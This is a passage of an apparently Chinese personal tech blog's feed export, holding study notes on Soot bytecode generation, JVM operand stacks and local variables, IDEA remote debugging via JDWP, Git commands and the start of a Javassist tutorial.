units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "return"</span></span><br><span class="line">            units.add(Jimple.v().newReturnVoidStmt());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">        OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">        PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">        JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">        jasminClass.print(writerOut);</span><br><span class="line">        writerOut.flush();</span><br><span class="line">        streamOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;鱼沉雁杳天涯路，始信人间别离苦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;老博客归档。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Soot" scheme="https://0range228.github.io/tags/Soot/"/>
    
  </entry>
  
  <entry>
    <title>JVM操作数栈与局部变量表</title>
    <link href="https://0range228.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/"/>
    <id>https://0range228.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/</id>
    <published>2021-03-17T08:47:58.000Z</published>
    <updated>2021-05-18T03:52:51.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>知人者智，自知者明。</p></blockquote><p>最近在看Java污点分析，逃不开<code>对象.方法</code>调用形式，做个记录，随时更新。</p><a id="more"></a><h1 id="温故"><a href="#温故" class="headerlink" title="温故"></a>温故</h1><p>动态语言与静态语言</p><p>对类型的检查，在编译期就是静态语言，在运行期就是动态语言；</p><p>静态语言是判断变量自身的类型信息，动态语言是判断变量值的类型信息</p><p>动态语言中，变量没有类型信息，变量值才有类型信息。</p><p>Java: String info = “atguigu”;//info = atguigu;会报错 类型不匹配</p><p>JS：var name = 123;var name = “sun”;都可以 var就是一个变量的泛化。</p><p>方法调用</p><p>方法的绑定机制：符号引用转换为调用方法</p><p>静态链接：</p><p>当一个字节码装进JVM内部的时候，如果被调用的方法在编译器可知，且运行时保持不变。静态链接</p><p>动态链接：</p><p>当被调用的方法无法在编译期确定下来，只有在程序运行起来，才能确定。动态链接</p><p>动态链接：将符号引用直接变成直接引用</p><p>在.java-&gt;.class过程中，所有的变量和方法引用都会作为符号引用（#5）保存在class文件的常量池中</p><p>比如描述一个方法调用了另外的其他方法，就是通过常量池中指向方法的符号引用来表示的。</p><p>动态链接的用途就是去运行时常量池（在方法区里面）里面把这些符号引用转换为调用方法的直接引用。</p><blockquote><p>重点!!!</p><ol><li>JVM是<strong>基于栈的计算模型</strong></li><li>在解析过程中，每当为Java方法分配栈帧时<ul><li>执行每条执行之前，JVM要求该指令的操作数已被压入操作数栈中</li><li>在执行指令时，JVM会将该指令所需要的操作数<strong>弹出</strong>，并将该指令的结果重新<strong>压入</strong>栈中</li></ul></li></ol></blockquote><h1 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h1><p>栈帧是线程私有的，每一个方法对应一个栈帧。</p><p>四个主要组成成分：操作数栈，局部变量表，动态链接，方法返回地址。（还有一些附加信息，无所谓了）</p><p>重点说两个：局部变量表和操作数栈</p><h2 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h2><p>当一个方法被调用时，会使用局部变量表来存储参数值和方法内部的方法局部变量。</p><p>他是一个数组，用来存放方法参数和定义在方法内部的方法变量。</p><p>可以是引用类型（String等），可以是对象引用，可以是返回地址。</p><p>线程私有数据。</p><p>如果当前方法是对象实例的成员方法（没有被static修饰），那局部变量表[0]存放的是this的引用。</p><p>参数分配完毕后，再根据方法体内部定义的局部变量顺序和作用域分配其余的变量槽。</p><p>这里基本数据类型（double long除外）+ 引用类型（String） 都是一个slot ；long double 都是两个slot</p><h2 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h2><p>也常称为操作栈，它是一个后入先出栈(LIFO)。</p><p>保存程序执行过程中的临时结果，保存中间变量。</p><p>当一个方法刚刚开始执行时，其操作数栈是空的，随着方法执行和字节码指令的执行，会从局部变量表或对象实例的字段中复制常量或变量写入到操作数栈，再随着计算的进行将栈中元素出栈到局部变量表或者返回给方法调用者，也就是出栈/入栈操作。一个完整的方法执行期间往往包含多个这样出栈/入栈的过程。</p><p>如果被调用的方法带有返回值的话，其返回值将会被压入当前栈帧的操作数栈中。</p><h2 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h2><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317174904301.png" alt="image-20210317174904301"></p><p>Javap -v Demo:</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317175016279.png" alt="image-20210317175016279"></p><p>流程：</p><p>操作数栈长度为2，局部变量表长度为4，参数大小为1 pc寄存器地址值：JVM字节码指令</p><p>bipush 10从常量池里取出10 放到操作数栈顶</p><p>istore_1 将操作数栈中栈顶元素给到局部变量表的1号位置 10（0号位置给了this）</p><p>bipush 20从常量池里取出20 放到操作数栈顶</p><p>istore_2 将操作数栈中栈顶元素给到局部变量表的2号位置  20</p><p>iload1从局部变量表中取出1号元素 10 放到操作数栈栈顶</p><p>Iload2从局部变量表中取出2号元素 20 放到操作数栈栈顶</p><p>iadd 将当前操作数栈的栈顶两个元素求和 结果放在栈顶</p><p>return结束 返回void</p><p>再看一个方法调用的：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203643349.png" alt="image-20210317203643349"></p><p>javap -v Main</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203803521.png" alt="image-20210317203803521"></p><p>先看创建一个对象：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317205038396.png" alt="image-20210317205038396"></p><ol><li>执行new指令时，JVM将指向一块<strong>已分配的但未初始化</strong>的内存引用压入操作数栈。此时A类在方法区，堆中创建一个A对象的空间，大小可以确定，一些值会进行默认初始化。</li><li>接下来dup就是将操作数栈栈顶的值（对象堆空间的引用值）复制一份，<strong>压入栈顶</strong>。</li><li>invokespecial指令将要以这个引用为调用者，调用其构造器<ul><li>该指令将<strong>消耗掉</strong>操作数栈上的元素，作为它的调用者和参数</li></ul></li><li>因此，在这之前利用dup<strong>指令</strong>复制一份new指令的结果，并用来调用构造器</li></ol><p>这里 invokespecial指令结束之后，返回对象的引用为void，栈中元素只有一个引用（之前复制的那个）</p><p>接着aload_1，将局部变量表里1号位置的元素（参数args）取出，放在栈顶</p><p>接下来invokevitural，调用虚方法method1(args)，这里javap -v A</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317223337010.png" alt="image-20210317223337010" style="zoom:50%;"><p>在method1内部，操作数栈大小为1，局部变量表为2（0号位置本类this）</p><p>首先aload_1将参数args放入操作数栈顶</p><p>接着areturn，将栈顶元素返回，是引用类型（String）</p><p>这时候回到之前main方法的操作数栈，返回的param放在了栈顶。</p><p>接着astore_2将返回值param放在了局部变量表的2号位置</p><p>此时操作数栈为空</p><p>接着继续new出来一个B对象，与上个A对象同理</p><p>依旧还是dup之后invokevirtual调用构造方法</p><p>之后aload_2将局部变量表里面的2号元素（也就是之前的param拿出来，也就是cmd）放到栈顶</p><p>invokevirtual去执行method2（cmd）方法</p><p>javap -v B看一下</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317224622996.png" alt="image-20210317224622996" style="zoom:50%;"><p>在method2里面 实例化了C对象 嵌套起来了</p><p>在method2里面，操作数栈大小为2，局部变量表大小为2</p><p>new-dup-init组合拳生成C对象 接下来调用method3（param）</p><p>javap -v C</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317225028439.png" alt="image-20210317225028439" style="zoom:50%;"><p>直接返回param</p><p>那么对于method3返回的结果，被B的method2进行了<code>11:areturn</code>返回</p><p>返回到哪里 ？ 返回到了调用method2的main方法内部<code>23:areturn</code>地方</p><p>作为main函数的最终结果返回。</p><h1 id="Java创建对象的过程"><a href="#Java创建对象的过程" class="headerlink" title="Java创建对象的过程"></a>Java创建对象的过程</h1><p><a href="https://mp.weixin.qq.com/s/3cm32TzROaQgyKf1TCl0Rg" target="_blank" rel="noopener">这篇</a>讲得非常好，来总结一下3种主流方法。</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure><p>最常用的创建方式。</p><p>对应字节码：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210322093031418.png" alt="image-20210322093031418"></p><p>在Java中，认为创建一个对象就是调用其构造方法，对于new Object()方法其实就是调用了Object类的无参构造方法，但是在字节码中，<strong>对象的创建和调用构造方法是分开的</strong>。</p><p>在上图字节码中，</p><p>new指令其实就是在堆中创建一个对象，并把对象的引用压入栈（指代操作数栈，后面同理）中。</p><p>dup指令会复制栈上最后的一个元素，然后将这个复制压入栈顶。为什么会有两个呢？</p><p>是<a href="https://www.zhihu.com/question/52749416" target="_blank" rel="noopener">因为</a>接下来的invokespecial指令会<strong>消耗</strong>掉操作数栈顶部的一个对象引用，作为传递给构造器的<code>this</code>参数，我们希望在invokespecial调用之后，在操作数栈顶还维持一个指向新建对象的引用，那么就得先在invokespecial之前先复制一份引用，也就是dup的原因。</p><h2 id="newInstance方法来创建"><a href="#newInstance方法来创建" class="headerlink" title="newInstance方法来创建"></a>newInstance方法来创建</h2><p>这里，<code>newInstance</code>方法是指<code>Class</code>类中的方法，<code>newInstance</code>方法会调用无参的构造方法创建对象。</p><p>两种模板：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User user = (User)Class.forName(<span class="string">"com.sec.User"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">User user = User<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br></pre></td></tr></table></figure><p><code>ldc</code>指令代表将常量池里的引用推入栈顶</p><p><code>forName</code>是静态方法 需要invokestatic</p><p><code>newInstance</code> 是虚方法，需要invokevirtual</p><h2 id="使用反射API来创建对象"><a href="#使用反射API来创建对象" class="headerlink" title="使用反射API来创建对象"></a>使用反射API来创建对象</h2><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;User&gt; cons = User<span class="class">.<span class="keyword">class</span>.<span class="title">getConstructor</span>()</span>;</span><br><span class="line">User user = cons.newInstance();</span><br></pre></td></tr></table></figure><h1 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h1><p>java中没有被static native修饰的方法就是是虚方法</p><p>感觉invokespecial init是消耗一个对象内存 不会返回任何东西（或者说返回void） </p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231200462.png" alt="image-20210317231200462"></p><p>注意最后这个pop弹栈操作，很关键。</p><p>首先new-dup出现两个ref在栈中 那么invokespecial会消耗一个对象引用 还会剩一个</p><p>最后的pop也就是将最后一个（栈顶）弹出来，操作数栈排空。</p><p>invokestatic 是不消耗任何对象引用，静态方法是不需要对象.的格式去调用，直接类.方法就好了</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231143953.png" alt="image-20210317231143953"></p><p>invokevirtual是获取通常为this和参数，然后一起进行方法调用。</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232352641.png" alt="image-20210317232352641" style="zoom:50%;"><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232507679.png" alt="image-20210317232507679" style="zoom:50%;">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;知人者智，自知者明。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近在看Java污点分析，逃不开&lt;code&gt;对象.方法&lt;/code&gt;调用形式，做个记录，随时更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="JVM" scheme="https://0range228.github.io/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>IDEA远程调试记录</title>
    <link href="https://0range228.github.io/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://0range228.github.io/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</id>
    <published>2021-03-15T06:34:39.000Z</published>
    <updated>2021-03-15T07:20:00.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>天街小雨润如酥，草色遥看近却无。</p></blockquote><p>记录IDEA远程调试过程。随时更新，参考<a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open" target="_blank" rel="noopener">yz</a>。</p><a id="more"></a><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>点击工具栏的<code>Add Configuration...</code>，点击左侧的<code>+</code>号，选择<code>Remote</code>，如下图：</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144011945.png" alt="image-20210315144011945"></p><p>创建之后，复制这段命令，记得要改成<code>suspend=y</code>。</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144220008.png" alt="image-20210315144220008"></p><h1 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h1><h2 id="有源码调试"><a href="#有源码调试" class="headerlink" title="有源码调试"></a>有源码调试</h2><p>这里在IDEA自带的终端里演示（系统shell当然也可以）：</p><p>cd classes:</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144259091.png" alt="image-20210315144259091"></p><p>输入这条命令<code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 com.sec.Test</code></p><p>注意末尾是你的包名类名，执行后终端会等待debug，这时候下断点可以看到终端里会配合输出。</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144746757.png" alt="image-20210315144746757"></p><h2 id="无源码-只有jar包"><a href="#无源码-只有jar包" class="headerlink" title="无源码 只有jar包"></a>无源码 只有jar包</h2><p>这种需求更加常见，对于jar包里的代码，下端点调试的想法会更多，记录一下。</p><p>首先，这里我是一个maven项目，<code>mvn clean package</code>即可，当然你直接shell打包也行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">jar -cvf test.jar *</span><br></pre></td></tr></table></figure><p>对于打包好的jar包，可以放在当前的IDEA项目下，右键-&gt;add as library，可以直接反编译源码</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150152050.png" alt="image-20210315150152050"></p><p>打开jar包，在想看的地方下端点</p><p>执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=<span class="number">5005</span> -cp Test.jar com.sec.Test</span><br></pre></td></tr></table></figure><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150434825.png" alt="image-20210315150434825"></p><p>点击小甲虫就完事了：</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150524937.png" alt="image-20210315150524937"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;天街小雨润如酥，草色遥看近却无。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;记录IDEA远程调试过程。随时更新，参考&lt;a href=&quot;https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;yz&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IDE" scheme="https://0range228.github.io/categories/IDE/"/>
    
    
      <category term="IDEA" scheme="https://0range228.github.io/tags/IDEA/"/>
    
  </entry>
  
  <entry>
    <title>Git笔记</title>
    <link href="https://0range228.github.io/Git%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/Git%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-05T16:29:37.000Z</published>
    <updated>2021-03-14T07:15:11.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>日长似岁闲方觉，事大如天醉亦休。</p></blockquote><p>整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。</p><a id="more"></a><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>本地 add 暂存区 commit -m 本地仓库 git push 远程仓库</p><p>git add     提交暂存区</p><p>git commit -m “xxx”     提交本地Git仓库</p><p>git pull     检查协同操作是否冲突</p><p>git push   上传远程仓库</p><p>git status  查看本地git任务状态</p><p>git log 查看操作日志</p><h1 id="实战记录"><a href="#实战记录" class="headerlink" title="实战记录"></a>实战记录</h1><h2 id="新建项目关联远程git仓库"><a href="#新建项目关联远程git仓库" class="headerlink" title="新建项目关联远程git仓库"></a>新建项目关联远程git仓库</h2><p>cd</p><p>git init</p><p>git add .</p><p>git commit -m “push “</p><p>git remote add origin GIT_LINK[.git] 关联远程仓库</p><p>git pull –rebase origin master 检查/校验 多人开发 </p><p>git push -u origin master</p><h2 id="更新之后提交至git仓库"><a href="#更新之后提交至git仓库" class="headerlink" title="更新之后提交至git仓库"></a>更新之后提交至git仓库</h2><p>cd</p><p>git add FILENAME</p><p>git commit -m “修改了xxx”</p><p>git pull –rebase origin master</p><p>git push -u origin master</p><h2 id="删除远程中仓库中的文件"><a href="#删除远程中仓库中的文件" class="headerlink" title="删除远程中仓库中的文件"></a>删除远程中仓库中的文件</h2><p>git rm -r -n –cached 文件/文件夹 预览暂存区中要删除哪些文件（只是预览）</p><p>git rm -r –cached 文件/文件夹 直接删除</p><p>git commit -m ‘xxx’</p><p>git push 提交远程仓库</p><p>如果远程+本地+暂存区，一起删除文件：</p><p>git rm file_path<br>git commit -m ‘delete somefile’<br>git push</p><h2 id="IDEA-amp-Github"><a href="#IDEA-amp-Github" class="headerlink" title="IDEA &amp; Github"></a>IDEA &amp; Github</h2><p>git init : VCS -&gt; Import into Version Control -&gt; Create Git Repositry 选择目标项目文件夹</p><p>git add .  : 右键项目 -&gt; Git -&gt; add</p><p>(首次配置，之后不用)</p><p>git remote : 右键项目 -&gt; Git -&gt; Repository -&gt; Remotes </p><p>name：origin</p><p>git：粘贴github仓库地址</p><p>git commit : 右键项目 -&gt;  commit directory -&gt; 在窗口中选择上传文件 上传记录</p><p>git push 右上箭头即可</p><p>不好使可以：</p><p>git pull </p><p>git pull origin master </p><p>git pull origin master –allow-unrelated-histories</p><p>git push -u origin master -f</p><p>对于没有的项目</p><p>可以VCS -&gt; Import into Version Control -&gt;Share Project on Github</p><p>对于git clone下来的项目，如修改之后想再次提交 可以直接右上push 箭头可以直接提交 commit pull push</p><p>红色：未add；<br>绿色：已add、未commit；<br>蓝色：已add、已commit、有改动；<br>灰色：忽略；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;日长似岁闲方觉，事大如天醉亦休。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="基础工具" scheme="https://0range228.github.io/categories/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Git" scheme="https://0range228.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Javassist学习笔记</title>
    <link href="https://0range228.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-02-16T11:13:46.000Z</published>
    <updated>2021-02-21T08:20:56.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>醉里挑灯看剑，梦回吹角连营。</p></blockquote><p>整理Javassist相关知识 。</p><a id="more"></a><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>比ASM更适合人类操纵字节码，使用API可以实现例如生成类、修改类的操作。</p><p>允许Java程序可以在运行时定义一个新的class、在JVM加载时修改class文件。</p><p>提供了2各层次的API：源码级别、字节码级别。</p><p>如果用户使用了源码级别的API，就可以在不了解Java字节码规范的情况下编辑class文件。整个API是基于Java语言词汇设计的。你甚至可以以源码文本形式指定插入字节码，javassist编译它是非常快的。</p><p>另一方面。字节码层次的API允许用户像其它编辑器一样直接编辑class文件。</p><p><a href="http://www.javassist.org/html/index.html" target="_blank" rel="noopener">API文档</a></p><h2 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h2><p>Javassist是一个处理字节码的类库。Java字节码存储在一个叫做*.class的二进制文件中。每个class文件包含一个Java类或者接口。</p><p><code>javassist.CtClass</code> 代表一个class文件的抽象类表示形式。一个<code>CtClass</code>(compile-time class编译时的类)是一个处理class文件的句柄，以下是一个简单的程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"test.Rectangle"</span>);</span><br><span class="line">cc.setSuperclass(pool.get(<span class="string">"test.Point"</span>));</span><br><span class="line">cc.writeFile();</span><br></pre></td></tr></table></figure><p>这段程序首先包含一个<code>ClassPool</code>对象，通过Javassist控制字节码的修改。</p><p><code>ClassPool</code>对象是代表class文件的<code>CtClass</code>对象的容器。它根据构造一个<code>CtClass</code>对象的需求读取一个class文件，并记录被构建好的对象以供将来进行访问。 为了修改一个类的定义，用户必须首先从<code>ClassPool</code>对象的<code>.get(className)</code>方法获取一个<code>CtClass</code>引用。 </p><p>在上述示例中，<code>CtClass</code>对象cc表示<code>ClassPool</code>中的类<code>test.Rectangle</code>，并且将其分配给变量<code>cc</code>。 <code>ClassPool</code>对象由静态方法<code>getDefault</code>方法查找默认的系统检索path返回。格式为“包名.类名”。</p><p>从实现上来看，<code>ClassPool</code>是一个<code>CtClass</code>的哈希表，使用class name作为key。</p><p><code>ClassPool.get()</code>方法通过检索这个哈希表找到一个<code>CtClass</code>对象关联指定的key。</p><p>如果<code>CtClass</code>对象没有找到，<code>get()</code>方法会读取class文件去构造一个<code>CtClass</code>对象，记录在哈希表中然后作为<code>get()</code>的返回值返回。</p><p>从<code>ClassPool</code>中获取到的<code>CtClass</code>对象是可以被修改的。在上述示例中，它被修改了 <code>test.Rectangle</code>的父类变更为<code>test.Point</code>,这个修改将会在最后<code>CtClass.writeFile()</code>方法调用后反映在class文件中。</p><p>javassist提供了写到类文件的方法：</p><p><code>writeFile()</code> 方法将<code>CtClass</code>对象转换到class文件并且将其写入本地磁盘。Javassist也提供了一个方法用于直接获取修改后的字节码：<code>toBytecode()</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] b = cc.toBytecode();</span><br></pre></td></tr></table></figure><p>也可以像这样直接加载<code>CtClass</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = cc.toClass();</span><br></pre></td></tr></table></figure><p><code>toClass</code> 请求当前线程的上下文类加载器去加载class文件，返回一个<code>java.lang.Class</code>对象。</p><p>例子：</p><h3 id="定义一个新类"><a href="#定义一个新类" class="headerlink" title="定义一个新类"></a>定义一个新类</h3><p>重新定义一个新的类，<code>ClassPool.makeClass</code>方法将会被调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个新的类</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"com.sec.Point"</span>);</span><br><span class="line">System.out.println(cc.toClass()); <span class="comment">// 输出class com.sec.Point</span></span><br></pre></td></tr></table></figure><p>这个程序定义了一个<code>Point</code>类，未包含任何成员，成员方法可以通过使用<code>CtClass</code>的<code>addMethod()</code>方法传入一个<code>CtMethod</code>的factory方法创建的对象作为参数来追加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个新的类</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"hello.make.Point"</span>);</span><br><span class="line"><span class="comment">//System.out.println(cc2.toClass().getMethods().length); // 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 追加方法</span></span><br><span class="line">cc.addMethod(CtMethod.make(<span class="string">"public void 